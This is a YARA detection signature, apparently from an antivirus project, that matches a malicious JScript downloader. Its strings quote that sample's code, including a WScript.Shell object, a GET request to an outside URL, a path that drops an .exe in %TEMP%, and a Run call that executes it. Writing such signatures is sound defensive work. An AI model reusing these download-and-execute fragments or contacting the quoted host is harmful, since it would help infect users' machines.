rule sig_20160328_7e39a6e16a868dcae3afa22717856a3f {
  meta:
    description = "datamaliciousorder - file 20160328_7e39a6e16a868dcae3afa22717856a3f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f666ff8a6786d61ecacb2a6b85d60081769ad5b48971903d373bfd5f1b53867d"

  strings:
    $s1  = "function Gnxpkecl() {return Cybnbe[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"RdDAmfOMoYHvuWyT.exe\";};" fullword ascii
    $s2  = "do {WScript[Svupxfje](Hgzpts() * 11)} while (Gocxrrb[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Nqmngx(Twgnb, Iyxcyo){return Twgnb - Iyxcyo;};" fullword ascii
    $s4  = "Gocxrrb[Uudgxxmvll](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s5  = "var Cybnbe = function Gnyzsqr() {return WScript[Eezixwfo](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Veemslycvv() {return ((Chaueh == true) && (Chaueh == Lyyvkdiqdh)) ? 1 : Ikbqnl;};" fullword ascii
    $s7  = "function Ggopabpe(Ojvfxihc){Cybnbe[\"Run\"](Ojvfxihc, Ikbqnl, Ikbqnl);};" fullword ascii
    $s8  = "Chaueh = true; " fullword ascii
    $s9  = "function Grkjorcig(){return Eezixwfo;};" fullword ascii
    $s10 = "var Lyyvkdiqdh = false;" fullword ascii
    $s11 = "function Flzpzkc(Xufwwot) {var Lggcfs = (1, 2, 3, 4, 5, Xufwwot); return Lggcfs;};" fullword ascii
    $s12 = "function Hgzpts(){return 22;};" fullword ascii
    $s13 = "return Nqmngx(Zxxwpwq, Teaklmv);" fullword ascii
    $s14 = "var Rmykwr = new this[\"Date\"]();" fullword ascii
    $s15 = "Lyyvkdiqdh = true; " fullword ascii
    $s16 = "function Mtjwgaoz(){return Xvvps;};" fullword ascii
    $s17 = " while (Trccly){" fullword ascii
    $s18 = "var Fpwywiqnd = false;" fullword ascii
    $s19 = "function Ekqhfhzllp()" fullword ascii
    $s20 = "var Chaueh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}